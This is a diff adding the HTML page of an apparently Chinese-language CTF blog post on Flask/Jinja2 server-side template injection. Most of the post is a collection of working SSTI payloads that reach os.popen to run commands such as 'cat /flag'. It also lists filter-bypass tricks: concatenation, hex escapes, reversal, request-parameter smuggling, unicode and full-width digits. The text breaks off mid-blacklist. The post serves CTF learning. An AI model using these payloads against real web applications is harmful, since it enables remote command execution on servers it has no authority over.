@@ -1,0 +1,446 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 7.3.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css" integrity="sha256-XOqroi11tY4EFQMR9ZYwZWKj5ZXiftSx36RRuC3anlA=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"example.com","root":"/","images":"/images","scheme":"Pisces","darkmode":false,"version":"8.20.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"copycode":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="前言在CTF中关于python的题目也有涉及，以前也遇到过，但大多比较零碎，再此梳理一下，一开始接触到的是SSTI，那就以SSTI为切入点把。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="CTF中python问题-ssti">
+<meta property="og:url" content="http://example.com/2021/04/07/CTF%E4%B8%ADpython%E9%97%AE%E9%A2%98-ssti/index.html">
+<meta property="og:site_name" content="My0n9s&#39;blog">
+<meta property="og:description" content="前言在CTF中关于python的题目也有涉及，以前也遇到过，但大多比较零碎，再此梳理一下，一开始接触到的是SSTI，那就以SSTI为切入点把。">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://i.loli.net/2021/04/09/2gol73Ta9LbtiCh.png">
+<meta property="og:image" content="https://i.loli.net/2021/04/09/Il1CjPnSuMOFe8K.png">
+<meta property="article:published_time" content="2021-04-07T08:31:52.000Z">
+<meta property="article:modified_time" content="2024-09-08T03:56:32.000Z">
+<meta property="article:author" content="My0n9s">
+<meta property="article:tag" content="python-ssti">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://i.loli.net/2021/04/09/2gol73Ta9LbtiCh.png">
+
+
+<link rel="canonical" href="http://example.com/2021/04/07/CTF%E4%B8%ADpython%E9%97%AE%E9%A2%98-ssti/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"http://example.com/2021/04/07/CTF%E4%B8%ADpython%E9%97%AE%E9%A2%98-ssti/","path":"2021/04/07/CTF中python问题-ssti/","title":"CTF中python问题-ssti"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>CTF中python问题-ssti | My0n9s'blog</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">My0n9s'blog</p>
+      <i class="logo-line"></i>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="Search" role="button">
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a></li>
+  </ul>
+</nav>
+
+
+
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0"><span class="nav-number">1.1.</span> <span class="nav-text">参考文章</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%A6%82%E8%BF%B0"><span class="nav-number">1.2.</span> <span class="nav-text">概述</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%80%E4%BA%9B%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86"><span class="nav-number">1.3.</span> <span class="nav-text">一些基础知识</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9D%A5%E7%9C%8B%E5%87%A0%E4%B8%AApayload"><span class="nav-number">1.4.</span> <span class="nav-text">来看几个payload</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%BB%95%E8%BF%87"><span class="nav-number">1.5.</span> <span class="nav-text">绕过</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%BF%87%E6%BB%A4%E5%85%B3%E9%94%AE%E8%AF%8D"><span class="nav-number">1.5.1.</span> <span class="nav-text">过滤关键词</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%BF%87%E6%BB%A4"><span class="nav-number">1.5.2.</span> <span class="nav-text">过滤  .</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%BF%87%E6%BB%A4-1"><span class="nav-number">1.5.3.</span> <span class="nav-text">过滤[ ]</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%BF%87%E6%BB%A4-2"><span class="nav-number">1.5.4.</span> <span class="nav-text">过滤 _</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%BF%87%E6%BB%A4%E4%BA%86%E5%BC%95%E5%8F%B7"><span class="nav-number">1.5.5.</span> <span class="nav-text">过滤了引号</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%BF%87%E6%BB%A4%E4%BA%86%E5%8F%8C%E5%A4%A7%E6%8B%AC%E5%8F%B7"><span class="nav-number">1.5.6.</span> <span class="nav-text">过滤了双大括号</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#unicode%E7%BB%95%E8%BF%87"><span class="nav-number">1.5.7.</span> <span class="nav-text">unicode绕过</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%BB%95%E8%BF%87%E6%95%B0%E5%AD%97"><span class="nav-number">1.5.8.</span> <span class="nav-text">绕过数字</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%87%91%E4%B8%8E%E6%8B%BC%E6%8E%A5"><span class="nav-number">1.6.</span> <span class="nav-text">凑与拼接</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%B0%8F%E7%BB%93"><span class="nav-number">1.7.</span> <span class="nav-text">小结</span></a></li></ol></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="My0n9s"
+      src="/images/touxiang.jpeg">
+  <p class="site-author-name" itemprop="name">My0n9s</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">76</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">12</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">18</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2021/04/07/CTF%E4%B8%ADpython%E9%97%AE%E9%A2%98-ssti/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/touxiang.jpeg">
+      <meta itemprop="name" content="My0n9s">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="My0n9s'blog">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="CTF中python问题-ssti | My0n9s'blog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          CTF中python问题-ssti
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2021-04-07 16:31:52" itemprop="dateCreated datePublished" datetime="2021-04-07T16:31:52+08:00">2021-04-07</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">Edited on</span>
+      <time title="Modified: 2024-09-08 11:56:32" itemprop="dateModified" datetime="2024-09-08T11:56:32+08:00">2024-09-08</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/Web/" itemprop="url" rel="index"><span itemprop="name">Web</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>在CTF中关于python的题目也有涉及，以前也遇到过，但大多比较零碎，再此梳理一下，一开始接触到的是SSTI，那就以SSTI为切入点把。</p>
+<span id="more"></span>
+
+
+
+<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><code>https://xz.aliyun.com/t/3679#toc-7</code>关于SSTI原理机制师傅们写的很清晰了，这里不作累述，主要记录SSTI的一些payload和绕过方式</p>
+<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>SSTI主要考察的就是绕过，一开始我们会有一个总的思维方式，就是去构造一个类，然后一层一层去追溯到基类，然后调用基类某个模块的某个方法，来执行系统命令。大体上出题都是围绕着过滤了一些可用的字符，然后你怎么去构造，去绕过。</p>
+<h2 id="一些基础知识"><a href="#一些基础知识" class="headerlink" title="一些基础知识"></a>一些基础知识</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">__class__    类的一个内置属性，表示实例对象的类</span><br><span class="line">__base__     类型对象的直接基类</span><br><span class="line">__bases__    类型对象的全部基类，以元组的形式返回</span><br><span class="line">__mro__      也是会返回类型对象的基类</span><br><span class="line">__subclasses__()  返回这个类的子类集合</span><br><span class="line">__init__     初始化类，返回的类型是function</span><br><span class="line">__globals__  获取function所处空间下可使用的module，方法以及所有变量</span><br><span class="line">__dic__      类的静态函数、类函数、普通函数、全局变量以及一些内置的属性都是放在类的__dict__里</span><br><span class="line">__getattribute__()   实例、类、函数都具有的__getattribute__魔术方法。事实上，在实例化的对象进行.操作的时候,会调用这个方法</span><br><span class="line">__getitem__()        调用字典中的键值，其实就是调用这个魔术方法，比如Myangs[<span class="string">&#x27;c&#x27;</span>]，就是myangs.__getitem__(<span class="string">&#x27;c&#x27;</span>)</span><br><span class="line">__builtins__         内建名称空间，内建名称空间有许多名字到对象之间映射，而这些名字其实就是内建函数的名称，对象就是这些内建函数本身。即里面有很多常用的函数。</span><br><span class="line"><span class="built_in">__import__</span>           动态加载类和函数，也就是导入模块，经常用于导入os模块，<span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).popen(<span class="string">&#x27;ls&#x27;</span>).read()</span><br><span class="line">__str__()     返回描写这个对象的字符串，可以理解成就是打印出来。</span><br><span class="line">url_for              flask的一个方法，可以用于得到__builtins__，而且url_for.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>]含有current_app</span><br><span class="line">get_flashed_messages flask的一个方法，可以用于得到__builtins__，而且url_for.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>]含有current_app</span><br><span class="line">lipsum               flask的一个方法，可以用于得到__builtins__，而且lipsum.__globals__含有os模块：&#123;&#123;lipsum.__globals__[<span class="string">&#x27;os&#x27;</span>].popen(<span class="string">&#x27;ls&#x27;</span>).read()&#125;&#125;</span><br><span class="line">current_app    一个全局变量</span><br><span class="line">config         当前application的所有配置</span><br><span class="line">-----</span><br><span class="line">request  可以用于获取字符串来绕过  后面会有一个payload给出</span><br><span class="line">request.args  返回请求中的参数(字典形式) 例如xxx.com?a=<span class="number">1</span>&amp;b=<span class="number">2</span>  会返回&#123;<span class="string">&quot;a&quot;</span>:<span class="number">1</span>,<span class="string">&quot;b&quot;</span>:<span class="number">2</span>&#125;  如果是requests.args.a  就返回<span class="number">1</span></span><br><span class="line">request.values 返回请求中的参数和form </span><br><span class="line">request.cookies cookie参数</span><br><span class="line">request.form   返回请求中post传参的值</span><br><span class="line">-----</span><br><span class="line">&#123;% %&#125;  //可以用来执行语句，例如循环之类。</span><br></pre></td></tr></table></figure>
+
+<p>以上是常见的一些利用点和方法，接下来介绍一些常用的过滤器，这里我对过滤器的理解就是方便我们去绕过和凑的函数方法：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">join()  //将序列中的参数值拼接成字符串</span><br><span class="line">reverse() //字符串反转</span><br><span class="line">length()  //返回字符串长度</span><br><span class="line">replace(value,old,new) //将old替换成new </span><br><span class="line">first() //返回序列的第一个元素</span><br><span class="line">last()  //返回序列的最后一个元素</span><br><span class="line"><span class="built_in">sum</span>()   //返回列表内数值的和</span><br><span class="line">string() //将变量转换成字符串</span><br><span class="line">lower()  //将字符串转换成小写</span><br><span class="line">upper()  //将字符串转换成大写 </span><br><span class="line"><span class="built_in">abs</span>()    //返回一个数的绝对值</span><br></pre></td></tr></table></figure>
+
+<h2 id="来看几个payload"><a href="#来看几个payload" class="headerlink" title="来看几个payload"></a>来看几个payload</h2><p>以CTFSHOW ssti入门为例子：</p>
+<p><code>?name=&#123;&#123;''.__class__.__mro__[1].__subclasses__()[132].__init__.__globals__['popen']('cat /flag').read()&#125;&#125;</code>  </p>
+<p>这里是利用了<code>&lt;class &#39;os._wrap_close&#39;&gt;</code>  ，然后 调用 popen 来命令执行，返回的是file，是read的对象，可以调用read方法。</p>
+<p>当然，我们也可以想办法得到 <code>__builtins__</code>  ，然后调用eval，来执行命令。</p>
+<p><code>?name=&#123;&#123;url_for.__globals__['__builtins__']['eval']("__import__('os').popen('cat /flag').read()")&#125;&#125;</code>  </p>
+<p>这里直接利用了内置的函数<code>url_for</code>  ,第一条payload ，我们知道从开头一直到 init 那里，是返回 function的。</p>
+<p>还可以直接：</p>
+<p><code>?name=&#123;&#123;x.__init__.__globals__['__builtins__']['eval']("__import__('os').popen('cat /flag').read()")&#125;&#125;</code>   利用这个来获得builtins ，从而来执行eval 。这里x 可以换成其他字母。</p>
+<p>和request 有关的：</p>
+<p><code>?name=&#123;&#123;url_for.__globals__[request.args.a][request.args.b](request.args.c).read()&#125;&#125;&amp;a=os&amp;b=popen&amp;c=cat /flag </code>  </p>
+<p>这里就是直接利用了 request来获取get参数的变量，这样可以摆脱引号</p>
+<p>相似原理的还有：</p>
+<p><code>?name=&#123;&#123;url_for.__globals__[request.cookies.a][request.cookies.b](request.cookies.c).read()&#125;&#125;</code> 然后我们cookie传入：<code>a=os;b=popen;c=cat /flag</code></p>
+<p><code>?name=&#123;&#123;url_for.__globals__[request.values.a][request.values.b](request.values.c).read()&#125;&#125;</code>  这里values包括get和post，我们通过两种方式传的都可以拿到。</p>
+<p>把常见的payload汇个总吧：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123;&#123;<span class="string">&#x27;&#x27;</span>.__class__.__mro__[<span class="number">1</span>].__subclasses__()[<span class="number">132</span>].__init__.__globals__[<span class="string">&#x27;popen&#x27;</span>](<span class="string">&#x27;cat /flag&#x27;</span>).read()&#125;&#125;</span><br><span class="line">?name=&#123;&#123;url_for.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;eval&#x27;</span>](<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;cat /flag&#x27;).read()&quot;</span>)&#125;&#125;</span><br><span class="line">?name=&#123;&#123;x.__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;eval&#x27;</span>](<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;cat /flag&#x27;).read()&quot;</span>)&#125;&#125;</span><br><span class="line">?name=&#123;&#123;url_for.__globals__[request.args.a][request.args.b](request.args.c).read()&#125;&#125;&amp;a=os&amp;b=popen&amp;c=cat /flag</span><br><span class="line"></span><br><span class="line">?name=&#123;&#123;url_for.__globals__[request.cookies.a][request.cookies.b](request.cookies.c).read()&#125;&#125; 然后cookie字段传入</span><br><span class="line">a=os;b=popen;c=cat /flag</span><br><span class="line"></span><br><span class="line">?name=&#123;&#123;url_for.__globals__[request.values.a][request.values.b](request.values.c).read()&#125;&#125;这里values包括get和post，我们通过两种方式传的都可以拿到。</span><br><span class="line"></span><br><span class="line">?a=__globals__&amp;b=os&amp;c=cat /flag&amp;name=&#123;% <span class="built_in">print</span>(lipsum|attr(request.values.a)).get(request.values.b).popen(request.values.c).read() %&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;lipsum.__globals__[<span class="string">&#x27;os&#x27;</span>].popen(<span class="string">&#x27;ls&#x27;</span>).read()&#125;&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>其实以上几个payload核心思想是一样的，payload千变万化，主要就是为了去绕，接下来会把重点放在绕过上面。</p>
+<h2 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h2><h3 id="过滤关键词"><a href="#过滤关键词" class="headerlink" title="过滤关键词"></a>过滤关键词</h3><p>如果把一些比如<code>globals、builtins、subclasses </code> 等一些关键词给ban了，怎么去绕过呢？</p>
+<p>想办法去组合，去凑。</p>
+<p><strong>利用拼接</strong></p>
+<ul>
+<li>利用+号来拼接</li>
+</ul>
+<p>（注意加号得编码一下，不然会被解析成空格，有时候会造成500）</p>
+<p>比如 <code>?name=&quot;&quot;.__class__</code>  我一开始想的是<code>?name=&quot;&quot;.__%2bcla%2bss__</code>  发现直接给500了。</p>
+<p>这里如果是想利用拼接的话，测试发现直接用点不行，得用<strong>中括号</strong> <code>?name=&#123;&#123;''["__cla"%2b"ss__"]&#125;&#125;</code></p>
+<p>中括号里面得是字符串类型，不然也无法成功执行。 比如直接<code>?name=&#123;&#123;''[__class__]&#125;&#125;</code>  也是无效的</p>
+<ul>
+<li>不用+号</li>
+</ul>
+<p>emmm</p>
+<p>后来发现其实不用+，也可以拼接的。 <code>?name=&#123;&#123;''["__cla""ss__"]&#125;&#125;</code> </p>
+<ul>
+<li>在jinjia2里面利用~ 去拼接</li>
+</ul>
+<p><code>&#123;%set a='__cla' %&#125;&#123;%set b='ss__'%&#125;&#123;&#123;""[a~b]&#125;&#125;</code> </p>
+<ul>
+<li>利用chr拼接，前提咱们先得得到chr</li>
+</ul>
+<p><code>?name=&#123;% set chr=url_for.__globals__['__builtins__'].chr %&#125;&#123;&#123;''[chr(95)%2bchr(95)%2bchr(99)%2bchr(108)%2bchr(97)%2bchr(115)%2bchr(115)%2bchr(95)%2bchr(95)]&#125;&#125;</code></p>
+<ul>
+<li>利用format</li>
+</ul>
+<p><code>?name=&#123;&#123;''["&#123;0:c&#125;&#123;1:c&#125;&#123;2:c&#125;&#123;3:c&#125;&#123;4:c&#125;&#123;5:c&#125;&#123;6:c&#125;&#123;7:c&#125;&#123;8:c&#125;".format(95,95,99,108,97,115,115,95,95)]&#125;&#125;</code>  </p>
+<p>&#x2F;&#x2F;这里 {0:c}.format(95) &#x3D;&#x3D; a </p>
+<p><strong>利用编码</strong></p>
+<p><code>?name=&#123;&#123;''[\x5f\x5fclass\x5f\x5f]&#125;&#125;</code>  这里也可以直接全编码 <code>?name=&#123;&#123;''[\x5f\x5f\x63\x6c\x61\x73\x73\x5f\x5f]&#125;&#125;</code> 直接等效于<code>?name=&#123;&#123;''["__class__"]&#125;&#125;</code></p>
+<p>在py2环境下还可以：</p>
+<p><code>?name=&#123;&#123;''.("X19jbGFzc19f").decode("base64")&#125;&#125;</code></p>
+<p><strong>利用反转</strong></p>
+<p><code>?name=&#123;&#123;''['__ssalc__'[::-1]]&#125;&#125;</code>  </p>
+<p>如果过滤的只是小写</p>
+<p><code>?name=&quot;&quot;[&quot;__CLASS__&quot;.lower()]</code>  这个就比较鸡肋了。</p>
+<p><strong>利用前面提到的一些过滤器</strong></p>
+<p>过滤器这里一般都是结合管道符来用的，将前者的输出作为后者的输入</p>
+<p>利用reverse:</p>
+<p><code>?name=&#123;&#123;''["__ssalc__"|reverse]&#125;&#125;</code></p>
+<p>利用replace:</p>
+<p><code>?name=&#123;&#123;''["__cbbss__"|replace("bb","la")]&#125;&#125;</code></p>
+<p>利用format:</p>
+<p><code>name=&#123;&#123;""["%c%c%c%c%c%c%c%c%c"|format(95,95,99,108,97,115,115,95,95)]&#125;&#125;</code></p>
+<p>利用join:</p>
+<p><code>?name=&#123;&#123;''[("__cla","ss__")|join]&#125;&#125;</code></p>
+<h3 id="过滤"><a href="#过滤" class="headerlink" title="过滤  ."></a>过滤  .</h3><p>可以用[ ] 来绕过，比如一开始我们 <code>?name=&#123;&#123;''['__class__']&#125;&#125;</code>  这样</p>
+<p>也可以利用管道符配合 attr() , 比如 <code>?name=&#123;&#123;''|attr('__class__')&#125;&#125;</code></p>
+<h3 id="过滤-1"><a href="#过滤-1" class="headerlink" title="过滤[ ]"></a>过滤[ ]</h3><p>一开始想的是能不能用<code>()</code>绕过，测试发现不太行 <code>?name=&#123;&#123;''.__class__.__mro__(1)&#125;&#125;</code>  直接报500了</p>
+<p>但是可以利用 getitem来获取数字下标 <code>?name=&#123;&#123;''.__class__.__mro__.__getitem__(1)&#125;&#125;</code></p>
+<h3 id="过滤-2"><a href="#过滤-2" class="headerlink" title="过滤 _"></a>过滤 _</h3><ul>
+<li>利用编码 <code>__class__ =&gt; \x5f\x5fclass\x5f\x5f</code>    <code>\x5f</code>是下划线的编码.</li>
+<li>利用request   比如 <code>?name=&#123;&#123;''|attr(request.args.x1)&#125;&#125;</code>  然后传入 <code>x1=__class__</code>  其实某种程度上，. 和[ ] 可以相互转换的</li>
+</ul>
+<h3 id="过滤了引号"><a href="#过滤了引号" class="headerlink" title="过滤了引号"></a>过滤了引号</h3><p>可以去利用request去绕，把需要的字符串传进去。前面的payload 也提到了额，这里在拿出来看一下</p>
+<p><code>?name=&#123;&#123;url_for.__globals__.os.popen(request.args.a).read()&#125;&#125;</code>  然后传一下 <code>?a=cat /flag</code></p>
+<p>也可以利用字符串拼接，先提一下，比如<code>?name=&#123;&#123;config.__str__()[2]%2bconfig.__str__()[42]&#125;&#125;</code> 关于拼接后面会详细说。</p>
+<h3 id="过滤了双大括号"><a href="#过滤了双大括号" class="headerlink" title="过滤了双大括号"></a>过滤了双大括号</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">这里可以利用&#123;% %&#125; , 举个例子：</span><br><span class="line">&#123;% for i in &#x27;&#x27;.__class__.__mro__[1].__subclasses__() %&#125;&#123;% if i.__name__==&#x27;_wrap_close&#x27; %&#125;&#123;% print i.__init__.__globals__[&#x27;popen&#x27;](&#x27;ls&#x27;).read() %&#125;&#123;% endif %&#125;&#123;% endfor%&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="unicode绕过"><a href="#unicode绕过" class="headerlink" title="unicode绕过"></a>unicode绕过</h3><p>之前打太湖的时候，有道关于SSTI的题是直接用unicode绕过的，python flask 是可以正常解析unicode的 </p>
+<p>unicode字符转换的官网：</p>
+<p><code>https://www.compart.com/en/unicode</code></p>
+<p>有时候可以用unicode绕过部分字符的限制，比如{ 引号 数字等。</p>
+<h3 id="绕过数字"><a href="#绕过数字" class="headerlink" title="绕过数字"></a>绕过数字</h3><p>绕过数字除了可以用unicode，用全角数字也行。</p>
+<p>普通的半角 1  变成 全角 １ </p>
+<h2 id="凑与拼接"><a href="#凑与拼接" class="headerlink" title="凑与拼接"></a>凑与拼接</h2><p>其实凑也是拼接的一个思想，当好多要用的东西被过滤了，怎么处理</p>
+<p>以安恒月赛考到的一题ssti 为例子</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Hi young boy!&lt;/br&gt;</span><br><span class="line">Do you like ssti?&lt;/br&gt;</span><br><span class="line">blacklist&lt;/br&gt;   </span><br><span class="line"><span class="string">&#x27;.&#x27;</span>,<span class="string">&#x27;[&#x27;</span>,<span class="string">&#x27;\&#x27;&#x27;</span>,<span class="string">&#x27;&quot;&#x27;</span>,<span class="string">&#x27;&#x27;</span>\\<span class="string">&#x27;,&#x27;</span>+<span class="string">&#x27;,&#x27;</span>:<span class="string">&#x27;,&#x27;</span>_<span class="string">&#x27;,&lt;/br&gt;   </span></span><br><span class="line"><span class="string">&#x27;</span>ch<span class="string">r&#x27;,&#x27;</span>pop<span class="string">&#x27;,&#x27;</span><span class="keyword">class</span><span class="string">&#x27;,&#x27;</span>base<span class="string">&#x27;,&#x27;</span>mro<span class="string">&#x27;,&#x27;</span>init<span class="string">&#x27;,&#x27;</span><span class="built_in">globals</span><span class="string">&#x27;,&#x27;</span>get<span class="string">&#x27;,&lt;/br&gt;   </span></span><br><span class="line"><span class="string">&#x27;</span><span class="built_in">eval</span><span class="string">&#x27;,&#x27;</span><span class="built_in">exec</span><span class="string">&#x27;,&#x27;</span>os<span class="string">&#x27;,&#x27;</span>popen<span class="string">&#x27;,&#x27;</span><span class="built_in">open</span><span class="string">&#x27;,&#x27;</span>read<span class="string">&#x27;,&lt;/br&gt;   </span></span><br><span class="line"><span class="string">&#x27;</span>select<span class="string">&#x27;,&#x27;</span>url_fo<span 